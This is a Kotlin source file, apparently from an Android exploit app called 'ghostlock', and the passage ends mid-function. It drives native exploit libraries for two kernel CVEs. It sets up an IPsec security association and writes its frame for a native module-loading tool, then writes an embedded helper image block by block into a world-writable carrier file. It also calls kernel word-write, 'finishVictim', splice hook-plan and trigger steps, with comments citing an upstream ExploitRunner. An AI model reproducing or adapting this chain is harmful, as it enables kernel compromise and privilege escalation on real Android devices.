package com.ghostlock.app.tempui

import com.ghostlock.app.core.generated.CredentialLayout43499
import com.ghostlock.app.core.generated.FinishVictim43499
import com.ghostlock.app.core.generated.HookPlanRequest43284
import com.ghostlock.app.core.generated.Init43284
import com.ghostlock.app.core.generated.ModuleCheck43284
import com.ghostlock.app.jni.cve43284.Assembled43284
import com.ghostlock.app.jni.cve43499.Assembled43499
import com.ghostlock.app.core.generated.Wait43284

import com.ghostlock.app.core.generated.Init43499
import com.ghostlock.app.core.generated.KernelLayout43499
import com.ghostlock.app.core.generated.Prepare43499
import com.ghostlock.app.core.generated.TargetOffsets43499
import com.ghostlock.app.core.generated.WordWrite43499
import com.ghostlock.app.jni.cve43284.Native43284
import com.ghostlock.app.jni.cve43499.Native43499
import com.ghostlock.app.log.GhostLog

/**
 * 新函数面的真机探针（D2 装配的门禁）。
 *
 * 它证明的是"**新库能被 Kotlin 调用**"这件事，逐项如下：
 *  1. 两个库各自加载成功（一个 backend 一个库）；
 *  2. create 给出正句柄；initialize 接受生成的 DTO（43499 四组）并按名回答；
 *  3. snapshot 回来的是**具名**数组（名字由 native 的 snapshotFields 导出，不手抄）；
 *  4. 没有设备 device hook 的调用一律**具名拒绝**（op-not-wired:<函数名>）；
 *  5. shutdown / destroy 走通，销毁后句柄作废（stale-handle）。
 *
 * 参数用哨兵值（占位）：真实 profile 仍在设计（本阶段目标到 J7 为止），所以这里只求"值能一路
 * 走到该到的地方"，不求它们是这一台机器的真值。
 */
object TypedBackendProbe {
    /** 探针日志的 logcat 标签。 */
    const val TAG = "GhostlockTyped"

    /**
     *  一步的**前后各一行**日志：调用了什么 + 参数（前），返回 + 耗时 ms（后）。
     *
     *  成功历史：每一步的两端都是同一条链上已验证过的调用（native 侧 43284 的写链见
     *  git show 6f7ded87:src/core/backend/cve_2026_43284/real_ops.cpp:260-326 与
     *  steps/chain.cpp:215-263）；这里只把调用与返回记成事实。
     *  只记事实：不判断、不吞异常、不改返回值 —— 调用方的控制流原样不动。
     */
    private class StepMeter(private val line: (String) -> Unit) {
        private var startedNs = 0L

        /** 调用前一行：名字 + 参数。 */
        fun before(what: String, params: String) {
            startedNs = System.nanoTime()
            line("typed: " + what + " <- " + params)
        }

        /** 调用后一行：名字 + 返回 + 耗时 ms。 */
        fun after(what: String, returned: String) {
            val tookMs = (System.nanoTime() - startedNs) / 1_000_000L
            line("typed: " + what + " -> " + returned + " took=" + tookMs + "ms")
        }
    }

    /** 跑两个 backend 的探针。@return 每一行（屏幕与 logcat 相同）。 */
    /** 探针拿到的 Context：建 SA（IpSecManager）要用它。 */
    @Volatile
    private var probeContext: android.content.Context? = null

    /**
     *  封装接收侧：**一直持有**（强引用）。
     *  关掉它、或让它被 GC 收走，内核就不再把 ESP-in-UDP 报文交给 xfrm —— 我们手搓的报文会无人认领。
     */
    @Volatile private var encapSocket: android.net.IpSecManager.UdpEncapsulationSocket? = null

    /** SA 建好后的材料：**只给写路径**用（门/拼装的材料不受影响）。 */
    @Volatile private var saSpi: Int = 0
    @Volatile private var saEncapPort: Int = 4500
    @Volatile private var saAesKey: ByteArray? = null
    @Volatile private var saHmacKey: ByteArray? = null
    /** 本次会话的 ESP 源端口：由一次真实 bind 取得（照上游：开 DatagramSocket → getLocalPort → close）。 */
    @Volatile private var saSenderPort: Int = 0

    /**
     *  SA 是否就绪：只有 transport transform 建成、且留存 aes/hmac 各 32 字节非零时才置 true。
     *  它是链的**硬前置**（[ensureChainReady]）：为 false 时整条链不启动。
     */
    @Volatile private var saReady: Boolean = false

    /** 建 SA 整个进程只尝试一次；失败后每次点链都直接拒跑，不再重试（避免每次点击都重来一遍）。 */
    private val saAttempted = java.util.concurrent.atomic.AtomicBoolean(false)

    /** 建 SA 的互斥：按钮预检与 runOnce 可能先后进来，保证只建一条。 */
    private val saLock = Any()

    /** transform 的强引用：close 或被回收都会拆掉内核里那条 SA（写阶段还要用它跑几十秒）。 */
    @Volatile private var saTransform: android.net.IpSecTransform? = null

    /** 逐行回调：界面要在**过程中**看到每一行（跑完才返回的列表看不见进度）。 */
    @Volatile
    private var lineListener: ((String) -> Unit)? = null

    /** 单飞：同一条链不允许并发跑（启动自检与按钮同时跑会互撞 —— 2026-10-15 真机证据）。 */
    private val running = java.util.concurrent.atomic.AtomicBoolean(false)

    /**
     *  跑两个 backend 的探针，并把每一行**实时**交给 @p onLine。
     *
     *  @param context 应用上下文（建 SA 要用）。
     *  @param onLine 每产生一行就调用一次（在工作线程上）。
     *  @return 与 onLine 收到内容相同的完整列表。
     */
    fun run(context: android.content.Context, onLine: (String) -> Unit): List<String> {
        lineListener = onLine
        return try {
            run(context)
        } finally {
            lineListener = null
        }
    }

    fun run(context: android.content.Context): List<String> {
        if (!running.compareAndSet(false, true)) {
            val busy = listOf("typed: 攻击正在运行中（单飞守卫：同一条链不允许并发）")
            lineListener?.invoke(busy[0])
            return busy
        }
        try {
            return runOnce(context)
        } finally {
            running.set(false)
        }
    }

    /**
     *  链子的本体（由 run 做单飞守卫后调用）。
     *
     *  @note 第一件事是 [ensureChainReady]：SA 必须先于任何 probe 调用建立（21:18 冷跑的真因是顺序反了）。
     */
    private fun runOnce(context: android.content.Context): List<String> {
        probeContext = context
        val lines = mutableListOf<String>()
        /* 第一件事：把模块要执行的收尾脚本放到它的固定路径上。 */
        fun step(line: String) {
            lines += line
            GhostLog.i(TAG, line)
            lineListener?.invoke(line)
        }
        /* 硬前置：SA 必须先于任何 probe 调用建立。
         * 21:18 冷跑证据：链 21:18:06 先跑（材料为空 ⇒ saInit 退化 SPI=0x1234 ⇒ 报文全被内核丢），
         * 21:18:17 才建成 SA ⇒ 顺序反了。未就绪时只出两行拒跑原文，整条链（含 50 秒写阶段）不进入。 */
        val saRefusal = ensureChainReady(context, ::step)
        if (saRefusal != null) {
            return lines
        }
        /* 每步前后各一行（调用/参数 → 返回/耗时 ms）；只记事实，不改控制流。 */
        val meter = StepMeter(::step)
        /* first thing: the script the module runs must be in place (see deployUmhPayload). */
        deployUmhPayload(context) { line -> step(line) }
        /*
         *  43284 的唯一阻塞项的**关键一问**（纯 Kotlin，不需要 native）：
         *  公开 API 能不能**分配一个 SPI 并读回它**？能 ⇒ app 侧可自建 SA、帧材料自产；
         *  不能 ⇒ 只能走外部提供帧那条路。
         *
         *  判读：编译通过 = API 存在；真机跑出来 spi=… = 我们这条路成立（拿到数字）；
         *  抛具名异常 = 如实报告原因（例如需要权限）。
         */
        runCatching {
            val manager = context.getSystemService(android.net.IpSecManager::class.java)
            if (manager == null) {
                step("typed: ipsec spi skipped no-ipsec-service")
            } else {
                val address = java.net.InetAddress.getByName("127.0.0.1")
                meter.before("IpSecManager.allocateSecurityParameterIndex", "address=127.0.0.1")
                val allocated = manager.allocateSecurityParameterIndex(address)
                meter.after("IpSecManager.allocateSecurityParameterIndex", "spi=0x" + Integer.toHexString(allocated.spi))
                step("typed: ipsec spi allocated=0x" + Integer.toHexString(allocated.spi))
                meter.before("SecurityParameterIndex.close", "spi=0x" + Integer.toHexString(allocated.spi))
                allocated.close()
                meter.after("SecurityParameterIndex.close", "closed")
                step("typed: ipsec spi closed")
            }
        }.onFailure { problem ->
            step("typed: ipsec spi refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
        }

        /*
         *  第二问（与 SPI 同一族公开 API）：能不能开一个 UDP 封装套接字？
         *  注意：UdpEncapsulationSocket 不公开读端口的接口 ⇒ **端口由我们指定**（4500 = ESP-in-UDP 标准端口 ✓），
         *  开成功就等于拿到了 encap_port；被占用/被拒则给出具名原因。
         */
        runCatching {
            val manager = context.getSystemService(android.net.IpSecManager::class.java)
            if (manager == null) {
                step("typed: ipsec encap skipped no-ipsec-service")
            } else {
                meter.before("IpSecManager.openUdpEncapsulationSocket", "port=4500")
                val socket = manager.openUdpEncapsulationSocket(4500)
                meter.after("IpSecManager.openUdpEncapsulationSocket", "socket=" + socket)
                step("typed: ipsec encap opened port=4500")
                meter.before("UdpEncapsulationSocket.close", "port=4500")
                socket.close()
                meter.after("UdpEncapsulationSocket.close", "closed")
                step("typed: ipsec encap closed")
            }
        }.onFailure { problem ->
            step("typed: ipsec encap refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
        }

        /* 拼一帧**探针**材料落盘（只证明 SaFrame.build/writeTo 可用）：SPI 用刚申请到的那个，encap 用 4500。
         * 注意两点：① 不能写 SA 的真实路径 —— SA 区已先跑完，这里再写一次会用测试材料覆盖内核 SA 的那份帧；
         * ② 目的地必须是应用可创建文件的地方 —— /data/local/tmp 是 0771 shell:shell，app 只能改写已存在的
         *    666 文件、建不了新文件（2026-10-16 真机：探针帧 EACCES，SA 帧因文件已存在而成功）。 */
        runCatching {
            val manager = context.getSystemService(android.net.IpSecManager::class.java)
            val address = java.net.InetAddress.getByName("127.0.0.1")
            meter.before("IpSecManager.allocateSecurityParameterIndex", "address=127.0.0.1 (sa frame)")
            val allocated = manager!!.allocateSecurityParameterIndex(address)
            meter.after("IpSecManager.allocateSecurityParameterIndex", "spi=0x" + Integer.toHexString(allocated.spi))
            val aesKey = ByteArray(32) { index -> (0xA0 + index).toByte() }
            val hmacKey = ByteArray(32) { index -> (0xB0 + index).toByte() }
            meter.before("SaFrame.build", "spi=0x" + Integer.toHexString(allocated.spi) + " encap=4500 sender=0")
            val frame = com.ghostlock.app.jni.cve43284.SaFrame.build(
                spi = allocated.spi,
                encapPort = 4500,
                senderPort = 0,
                aesKey = aesKey,
                hmacKey = hmacKey,
            )
            meter.after("SaFrame.build", "bytes=" + frame.size)
            val probeFramePath = context.cacheDir.absolutePath + "/ghostlock-sa-probe.frame"
            meter.before("SaFrame.writeTo", "path=" + probeFramePath + " bytes=" + frame.size + " (probe)")
            val written = com.ghostlock.app.jni.cve43284.SaFrame.writeTo(
                probeFramePath,
                frame,
            )
            meter.after("SaFrame.writeTo", "ok=" + written)
            val digest = java.security.MessageDigest.getInstance("SHA-256").digest(frame)
                .joinToString("") { byte -> "%02x".format(byte) }
            step(
                "typed: sa frame written=" + written + " spi=0x" + Integer.toHexString(allocated.spi) +
                    " sha256=" + digest.take(16),
            )
            meter.before("SecurityParameterIndex.close", "spi=0x" + Integer.toHexString(allocated.spi) + " (sa frame)")
            allocated.close()
            meter.after("SecurityParameterIndex.close", "closed")
        }.onFailure { problem ->
            step("typed: sa frame refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
        }

        /* SA 区已抽成 ensureSa()：它是链的硬前置，runOnce 开头就建（见 ensureChainReady）。 */

        meter.before("probe43499", "-")
        probe43499(::step)
        meter.after("probe43499", "done")
        meter.before("probe43284", "-")
        probe43284(::step)
        meter.after("probe43284", "done")
        return lines
    }

    /**
     *  SA 区：把内核里的那条 SA 建起来 —— 开 encap 口 → 取真实 sender 端口 → 申请 SPI →
     *  建 transport transform（AES-CBC + HMAC-SHA256/128 + IPv4 封装）→ 用同一份材料把 88 字节帧落盘，
     *  并记录写路径要用的 sa* 五项（SPI / encap / sender / aes / hmac）。
     *
     *  顺序照上游 ExploitRunner.java:54-80。transform 与 encap 套接字都保持强引用：close 或被回收
     *  都会把内核里那条 SA 拆掉，随后几十秒的写阶段就全部落空。
     *
     *  @param context 取 IpSecManager 用（应用上下文）。
     *  @param step    统一日志回调（屏幕 / logcat / 文件同一行）。
     *  @return true = transform 建成且留存 aes/hmac 各 32 字节非零（[saReady]）；false = 任一步失败，已具名记录。
     *  @note 只记录 SPI、端口与密钥长度；密钥本体绝不进日志。
     */
    private fun ensureSa(context: android.content.Context, step: (String) -> Unit): Boolean {
        val meter = StepMeter(step)
        saReady = false
        val manager = context.getSystemService(android.net.IpSecManager::class.java)
        if (manager == null) {
            step("typed: ipsec sa refused no-ipsec-service")
            return false
        }
        val ready = runCatching {
            meter.before("IpSecManager.openUdpEncapsulationSocket", "port=0 (kernel picks)")
            val encap = manager.openUdpEncapsulationSocket()
            meter.after("IpSecManager.openUdpEncapsulationSocket", "socket=" + encap)
            meter.before("UdpEncapsulationSocket.getPort", "socket=" + encap)
            val encapPort = encap.getPort()
            meter.after("UdpEncapsulationSocket.getPort", "port=" + encapPort)
            step("typed: ipsec sa encapPort=" + encapPort)
            /* 照上游 ExploitRunner.java:71-74：先开一个普通 UDP 套接字、取它的本地端口、立刻关掉，
             * 把这个**真实可用**的端口交给封装声明与我们自己的 ESP 套接字（写死端口会 bind 不上，
             * 源端口被内核随机挑 ⇒ 与封装声明不一致 ⇒ 报文被 ICMP 拒绝，即我们见到的 ECONNREFUSED）。 */
            meter.before("DatagramSocket.bind", "ephemeral (sender port probe)")
            val senderProbe = java.net.DatagramSocket()
            saSenderPort = senderProbe.localPort
            meter.after("DatagramSocket.bind", "localPort=" + saSenderPort)
            senderProbe.close()
            step("typed: ipsec sa senderPort=" + saSenderPort)
            val loopback = java.net.InetAddress.getByName("127.0.0.1")
            meter.before("IpSecManager.allocateSecurityParameterIndex", "address=127.0.0.1 (sa)")
            val spiObj = manager.allocateSecurityParameterIndex(loopback)
            meter.after("IpSecManager.allocateSecurityParameterIndex", "spiObj=" + spiObj)
            meter.before("SecurityParameterIndex.getSpi", "spiObj=" + spiObj)
            val spi = spiObj.getSpi()
            meter.after("SecurityParameterIndex.getSpi", "spi=0x" + Integer.toHexString(spi))
            step("typed: ipsec sa spi=0x" + Integer.toHexString(spi))
            val aesKey = ByteArray(32) { index -> (0xA0 + index).toByte() }
            val hmacKey = ByteArray(32) { index -> (0xB0 + index).toByte() }
            /* 先留副本：Android 的 IpSec/Crypto API 会擦掉它拿到的密钥数组（2026-10-15 真机实证：
             * 我们留在字段里的那份变成了全零 ⇒ sa-set-missing）。我们留非零副本，把原件交给 API。 */
            encapSocket = encap
            saSpi = spi
            saEncapPort = encapPort
            saAesKey = aesKey.copyOf()
            saHmacKey = hmacKey.copyOf()
            meter.before("IpSecTransform.Builder.buildTransportModeTransform", "aes=CRYPT_AES_CBC hmac=AUTH_HMAC_SHA256/128 encapPort=" + encapPort + " senderPort=" + saSenderPort)
            val transform = android.net.IpSecTransform.Builder(context)
                .setEncryption(
                    android.net.IpSecAlgorithm(android.net.IpSecAlgorithm.CRYPT_AES_CBC, aesKey),
                )
                .setAuthentication(
                    android.net.IpSecAlgorithm(android.net.IpSecAlgorithm.AUTH_HMAC_SHA256, hmacKey, 128)  /* 128 bit = 16 字节，与帧的 icv_len 一致（96 会与 16 字节的 ICV 对不上） */,
                )
                .setIpv4Encapsulation(encap, saSenderPort)
                .buildTransportModeTransform(loopback, spiObj)
            /* 强引用：transform 被 close 或被回收都会拆掉刚建好的 SA（写阶段还要用它跑几十秒）。 */
            saTransform = transform
            val retainedAes = saAesKey?.count { byte -> byte != 0.toByte() } ?: 0
            val retainedHmac = saHmacKey?.count { byte -> byte != 0.toByte() } ?: 0
            step(
                "typed: ipsec sa built spi=0x" + Integer.toHexString(spi) +
                    " encap=" + encapPort + " sender=" + saSenderPort +
                    " aes=" + retainedAes + " hmac=" + retainedHmac +
                    " transform=" + (transform != null),
            )
            meter.after("IpSecTransform.Builder.buildTransportModeTransform", "transform=" + (transform != null))
            transform != null && retainedAes == 32 && retainedHmac == 32
        }.getOrElse { problem ->
            step("typed: ipsec sa refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
            false
        }
        saReady = ready
        /*
         * 帧落盘只服务设备上的外部工具（native pagecache_load_lkm 读这个路径）；它写不成**不影响 SA 本身**，
         * 所以放在 saReady 判定之后单独做、单独记 —— 绝不因一个辅助文件把已建成的 SA 判成未就绪。
         */
        if (ready) {
            runCatching {
                val frameAes = saAesKey ?: ByteArray(32)
                val frameHmac = saHmacKey ?: ByteArray(32)
                meter.before("SaFrame.build", "spi=0x" + Integer.toHexString(saSpi) + " encap=" + saEncapPort + " sender=" + saSenderPort)
                val frame = com.ghostlock.app.jni.cve43284.SaFrame.build(saSpi, saEncapPort, saSenderPort, frameAes, frameHmac)
                meter.after("SaFrame.build", "bytes=" + frame.size)
                meter.before("SaFrame.writeTo", "path=/data/local/tmp/ghostlock-sa.frame bytes=" + frame.size + " (SA)")
                val written = com.ghostlock.app.jni.cve43284.SaFrame.writeTo(
                    "/data/local/tmp/ghostlock-sa.frame",
                    frame,
                )
                meter.after("SaFrame.writeTo", "ok=" + written)
                step("typed: ipsec sa frame=" + written + " (SA 已建、帧按同一材料落盘)")
            }.onFailure { problem ->
                step("typed: ipsec sa frame refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
            }
        }
        return ready
    }

    /**
     *  链的硬前置检查：SA 未建立就**整条跳过**（不进入 50 秒写阶段），并给出两行拒跑原文。
     *
     *  @param context 建 SA 用；整个进程只尝试一次（[saAttempted]）。
     *  @param step    统一日志回调。
     *  @return null = SA 就绪、可以跑链；否则为两行拒跑原文（已通过 step 输出）。
     */
    fun ensureChainReady(context: android.content.Context, step: (String) -> Unit): List<String>? {
        synchronized(saLock) {
            if (!saAttempted.get()) {
                saAttempted.set(true)
                ensureSa(context, step)
            }
        }
        if (saReady) {
            return null
        }
        val refusal = listOf(
            "refusal=sa-material-missing",
            "hint: SA 未建立（IpSecManager transform=false 或密钥为空）⇒ 先修 SA 再跑链",
        )
        refusal.forEach { line -> step(line) }
        return refusal
    }

    private fun probe43499(step: (String) -> Unit) {
        if (!Native43499.ensureLoaded()) {
            step("typed: 43499 library missing (lib" + Native43499.LIBRARY + ".so)")
            return
        }
        step("typed: 43499 library loaded")
        val meter = StepMeter(step)
        val refusal = arrayOf("")
        meter.before("Native43499.create", "lib=" + Native43499.LIBRARY)
        val handle = Native43499.create()
        meter.after("Native43499.create", "handle=" + handle)
        if (handle <= 0) {
            step("typed: 43499 create failed")
            return
        }
        step("typed: 43499 create ok")

        val names = Native43499.snapshotFields()
        val snapshot = LongArray(names.size)
        meter.before("Native43499.initialize", "handle=" + handle + " init+layout+credential+targets")
        var code = Native43499.initialize(
            handle, init43499(), layout43499(), credential43499(), targets43499(), refusal,
        )
        meter.after("Native43499.initialize", "code=" + code + " refusal=" + refusal[0])
        step("typed: 43499 initialize code=" + code + " refusal=" + refusal[0])

        meter.before("Native43499.snapshot", "handle=" + handle + " fields=" + names.size)
        code = Native43499.snapshot(handle, snapshot, refusal)
        meter.after("Native43499.snapshot", "code=" + code + " values=" + snapshot.joinToString(","))
        step(
            "typed: 43499 snapshot code=" + code + " " +
                names.indices.joinToString(",") { names[it] + "=" + snapshot[it] },
        )

        val out = LongArray(names.size)
        meter.before("Native43499.prepare", "handle=" + handle)
        code = Native43499.prepare(handle, prepare43499(), out, refusal)
        meter.after("Native43499.prepare", "code=" + code + " refusal=" + refusal[0])
        step("typed: 43499 prepare code=" + code + " refusal=" + refusal[0])

        meter.before("Native43499.writeWord", "handle=" + handle + " address=0x" + java.lang.Long.toHexString(write43499().address) + " form=" + write43499().form)
        code = Native43499.writeWord(handle, write43499(), refusal)
        meter.after("Native43499.writeWord", "code=" + code + " refusal=" + refusal[0])
        step("typed: 43499 writeWord code=" + code + " refusal=" + refusal[0])

        meter.before("Native43499.finishVictim", "handle=" + handle + " status=0 value=0")
        code = Native43499.finishVictim(handle, FinishVictim43499(0, 0L), out, refusal)
        meter.after("Native43499.finishVictim", "code=" + code + " refusal=" + refusal[0])
        step("typed: 43499 finishVictim code=" + code + " refusal=" + refusal[0])

        meter.before("Native43499.shutdown", "handle=" + handle)
        code = Native43499.shutdown(handle, refusal)
        meter.after("Native43499.shutdown", "code=" + code + " refusal=" + refusal[0])
        step("typed: 43499 shutdown code=" + code + " refusal=" + refusal[0])
        meter.before("Native43499.destroy", "handle=" + handle)
        code = Native43499.destroy(handle, refusal)
        meter.after("Native43499.destroy", "code=" + code + " refusal=" + refusal[0])
        step("typed: 43499 destroy code=" + code + " refusal=" + refusal[0])
        meter.before("Native43499.shutdown", "handle=" + handle + " after-destroy")
        code = Native43499.shutdown(handle, refusal)
        meter.after("Native43499.shutdown", "code=" + code + " refusal=" + refusal[0])
        step("typed: 43499 shutdown-after-destroy code=" + code + " refusal=" + refusal[0])
    }

    private fun probe43284(step: (String) -> Unit) {
        if (!Native43284.ensureLoaded()) {
            step("typed: 43284 library missing (lib" + Native43284.LIBRARY + ".so)")
            return
        }
        step("typed: 43284 library loaded")
        val meter = StepMeter(step)
        val refusal = arrayOf("")
        meter.before("Native43284.create", "lib=" + Native43284.LIBRARY)
        val handle = Native43284.create()
        meter.after("Native43284.create", "handle=" + handle)
        if (handle <= 0) {
            step("typed: 43284 create failed")
            return
        }
        step("typed: 43284 create ok")

        meter.before("Native43284.initialize", "handle=" + handle + " init=spi/encap/icv+keys")
        var code = Native43284.initialize(handle, init43284(), refusal)
        meter.after("Native43284.initialize", "code=" + code + " refusal=" + refusal[0])
        step("typed: 43284 initialize code=" + code + " refusal=" + refusal[0])

        val snapshot = LongArray(6)
        meter.before("Native43284.snapshot", "handle=" + handle + " fields=6")
        code = Native43284.snapshot(handle, snapshot, refusal)
        meter.after("Native43284.snapshot", "code=" + code + " values=" + snapshot.joinToString(","))
        step(
            "typed: 43284 snapshot code=" + code +
                " " + Native43284.snapshotFields().indices.joinToString(",") { index ->
                    Native43284.snapshotFields()[index] + "=" + snapshot[index]
                },
        )

        /* 本构建自带的两张图与钩子计划：数据性的那部分，D2 已经接线，所以这里必须是 ok。 */
        meter.before("Native43284.embeddedImage", "handle=" + handle + " role=0 (splice helper)")
        val image = Native43284.embeddedImage(handle, 0, refusal)
        meter.after("Native43284.embeddedImage", "size=" + (image?.size ?: -1) + " refusal=" + refusal[0])
        step(
            "typed: 43284 embeddedImage code=" + (if (image == null) "null" else "ok") +
                " size=" + (image?.size ?: -1) + " refusal=" + refusal[0],
        )
        val hook = LongArray(10)
        val hookRequest = HookPlanRequest43284(
            ByteArray(16) { 0x11 }, "splice".toByteArray(), 0,
        )
        meter.before("Native43284.hookPlan", "handle=" + handle + " symbol=splice block=16")
        code = Native43284.hookPlan(handle, hookRequest, hook, refusal)
        meter.after("Native43284.hookPlan", "code=" + code + " words=" + hook.joinToString(","))
        step("typed: 43284 hookPlan code=" + code + " words=" + hook.joinToString(",") + " refusal=" + refusal[0])

        /* 模块校验：已经**接线**（纯计算）。用一段假字节 ⇒ 必须具名拒绝，不冒充成功。 */
        val moduleCheck = ModuleCheck43284(
            moduleImage = ByteArray(64) { 0x7F },
            kernelVermagic = "5.15.189-android13".toByteArray(),
        )
        meter.before("Native43284.moduleCheck", "handle=" + handle + " bytes=64 vermagic=5.15.189-android13")
        code = Native43284.moduleCheck(handle, moduleCheck, refusal)
        meter.after("Native43284.moduleCheck", "code=" + code + " refusal=" + refusal[0])
        step("typed: 43284 moduleCheck code=" + code + " refusal=" + refusal[0])

        /* 等终态：已经**接线**（marker 轮询）。给一个不存在的路径 ⇒ 预算内一直是 inflight。 */
        val terminal = LongArray(1)
        val wait = Wait43284(
            budgetMs = 40L,
            pollMs = 10L,
            successMarker = "ghostlock-ok".toByteArray(),
            failureMarker = "ghostlock-failed".toByteArray(),
            inFlightMarker = "ghostlock-running".toByteArray(),
            moduleMarker = "ghostlock".toByteArray(),
            moduleName = "/data/local/tmp/ghostlock-wait-probe".toByteArray(),
        )
        meter.before("Native43284.waitTerminal", "handle=" + handle + " budgetMs=40 pollMs=10")
        code = Native43284.waitTerminal(handle, wait, terminal, refusal)
        meter.after("Native43284.waitTerminal", "code=" + code + " state=" + terminal[0] + " refusal=" + refusal[0])
        step(
            "typed: 43284 waitTerminal code=" + code + " state=" + terminal[0] +
                " refusal=" + refusal[0],
        )

        /* 门：真的以 O_RDWR 打开一个本应用可写的文件（用自身的缓存目录），再看一个不存在的路径。 */
        /*
         * 门的目标：优先用设备上那份**一次性载体**（16 KiB、world-writable，退役链当年就用它），
         * 因为 ESP 写需要「旧块内容」才能组出向量 —— 16 字节的小文件写到第二块就没有旧块了（NoOldBlock）。
         * 退路才是应用自己的缓存目录里的自建文件。
         */
        val sharedCarrier = java.io.File("/data/local/tmp/ghostlock-carrier")
        val doorPath = if (sharedCarrier.canRead() && sharedCarrier.canWrite() && sharedCarrier.length() >= 4096L) {
            sharedCarrier
        } else {
            java.io.File(System.getProperty("java.io.tmpdir") ?: "/data/local/tmp", "ghostlock-door-probe").apply {
                writeBytes(ByteArray(16) { 0x5A })
            }
        }
        val ticket = LongArray(1)
        meter.before("Native43284.resolveTarget", "handle=" + handle + " path=" + doorPath.absolutePath + " role=1")
        code = Native43284.resolveTarget(
            handle,
            com.ghostlock.app.core.generated.ResolveTarget43284(
                role = 1, path = doorPath.absolutePath.toByteArray(), accessMode = 0,
            ),
            ticket,
            refusal,
        )
        meter.after("Native43284.resolveTarget", "code=" + code + " ticket=" + ticket[0] + " refusal=" + refusal[0])
        step("typed: 43284 resolveTarget code=" + code + " ticket=" + ticket[0] + " refusal=" + refusal[0])

        /* 读回一块：走门那扇 fd 的 pread（设备工作）。文件里是刚写的十六个 0x5A。 */
        val block = ByteArray(16)
        meter.before("Native43284.readBlock", "ticket=" + ticket[0] + " offset=0 len=16")
        code = Native43284.readBlock(
            handle,
            com.ghostlock.app.core.generated.ReadBlock43284(ticket = ticket[0], offset = 0L),
            block,
            refusal,
        )
        meter.after(
            "Native43284.readBlock",
            "code=" + code + " bytes=" + block.joinToString("") { byte -> "%02x".format(byte) } +
                " refusal=" + refusal[0],
        )
        step(
            "typed: 43284 readBlock code=" + code + " bytes=" +
                block.joinToString("") { byte -> "%02x".format(byte) } + " refusal=" + refusal[0],
        )

        /* patch1 via Kotlin：取本构建的 helper 镜像，按十六字节切块，逐块写进载体的开头。
           这一段的逻辑全在 Kotlin 侧（镜像来源、切块、偏移、顺序），native 只提供「取镜像」与「写一块」。 */
        var written = 0
        var refusedAt = -1
        val helper = Native43284.embeddedImage(handle, 0, refusal)
        if (helper == null) {
            step("typed: 43284 patch1-via-kotlin no-helper refusal=" + refusal[0])
        } else {
            var offset = 0L
            while (offset < helper.size) {
                val remaining = helper.size - offset.toInt()
                val width = if (remaining >= 16) 16 else remaining
                val chunk = helper.copyOfRange(offset.toInt(), offset.toInt() + width).copyOf(16)
                meter.before("Native43284.writeBlock", "ticket=" + ticket[0] + " offset=" + offset + " len=" + chunk.size + " block#" + written)
                code = Native43284.writeBlock(
                    handle,
                    com.ghostlock.app.core.generated.WriteBlock43284(
                        ticket = ticket[0], offset = offset, block = chunk,
                    ),
                    refusal,
                )
                meter.after("Native43284.writeBlock", "code=" + code + " offset=" + offset + " refusal=" + refusal[0])
                if (code != 0) {
                    refusedAt = offset.toInt()
                    break
                }
                written += 1
                offset += 16L
            }
            step("typed: 43284 patch1-via-kotlin blocks=" + written + " refusedAt=" + refusedAt)
            /* 回读第一块，看内容是不是真的落上了。 */
            val back = ByteArray(16)
            meter.before("Native43284.readBlock", "ticket=" + ticket[0] + " offset=0 len=16 (patch1 readback)")
            code = Native43284.readBlock(
                handle,
                com.ghostlock.app.core.generated.ReadBlock43284(ticket = ticket[0], offset = 0L),
                back,
                refusal,
            )
            meter.after(
                "Native43284.readBlock",
                "code=" + code + " bytes=" + back.joinToString("") { byte -> "%02x".format(byte) },
            )
            meter.before("Native43284.snapshot", "handle=" + handle + " (patch1 readback)")
            code = Native43284.snapshot(handle, snapshot, refusal)
            meter.after("Native43284.snapshot", "code=" + code + " writes=" + snapshot[4])
            step(
                "typed: 43284 patch1-readback code=" + code + " first16=" +
                    back.joinToString("") { byte -> "%02x".format(byte) } +
                    " writes=" + snapshot[4] + " flags=" + snapshot[1],
            )
        }

        /* 写一块：走落地对象（ESP 路线）。写成功只到 Dispatched；随后读回比较一致才会 Applied。 */
        meter.before("Native43284.writeBlock", "ticket=" + ticket[0] + " offset=0 block=33*16")
        code = Native43284.writeBlock(
            handle,
            com.ghostlock.app.core.generated.WriteBlock43284(
                ticket = ticket[0], offset = 0L, block = ByteArray(16) { 0x33 },
            ),
            refusal,
        )
        meter.after("Native43284.writeBlock", "code=" + code + " refusal=" + refusal[0])
        step("typed: 43284 writeBlock code=" + code + " refusal=" + refusal[0])
        meter.before("Native43284.snapshot", "handle=" + handle + " (after write)")
        code = Native43284.snapshot(handle, snapshot, refusal)
        meter.after("Native43284.snapshot", "code=" + code + " values=" + snapshot.joinToString(","))
        step(
            "typed: 43284 snapshot-after-write code=" + code +
                " " + Native43284.snapshotFields().indices.joinToString(",") { index ->
                    Native43284.snapshotFields()[index] + "=" + snapshot[index]
                },
        )

        val badTicket = LongArray(1)
        meter.before("Native43284.resolveTarget", "handle=" + handle + " path=/no/such/door role=2")
        code = Native43284.resolveTarget(
            handle,
            com.ghostlock.app.core.generated.ResolveTarget43284(
                role = 2, path = "/no/such/door".toByteArray(), accessMode = 0,
            ),
            badTicket,
            refusal,
        )
        meter.after("Native43284.resolveTarget", "code=" + code + " refusal=" + refusal[0])
        step("typed: 43284 resolveTarget(bad) code=" + code + " refusal=" + refusal[0])
        meter.before("Native43284.trigger", "handle=" + handle + " delayMs=150")
        code = Native43284.trigger(handle, com.ghostlock.app.core.generated.Trigger43284(150L), refusal)
        meter.after("Native43284.trigger", "code=" + code + " refusal=" + refusal[0])
        step("typed: 43284 trigger code=" + code + " refusal=" + refusal[0])

        meter.before("Native43284.shutdown", "handle=" + handle)
        code = Native43284.shutdown(handle, refusal)
        meter.after("Native43284.shutdown", "code=" + code + " refusal=" + refusal[0])
        step("typed: 43284 shutdown code=" + code + " refusal=" + refusal[0])
        meter.before("Native43284.destroy", "handle=" + handle)
        code = Native43284.destroy(handle, refusal)
        meter.after("Native43284.destroy", "code=" + code + " refusal=" + refusal[0])
        step("typed: 43284 destroy code=" + code + " refusal=" + refusal[0])

        meter.before("probeAssembled43284", "doorPath=" + doorPath.absolutePath)
        probeAssembled43284(step, doorPath.absolutePath)
        meter.after("probeAssembled43284", "done")

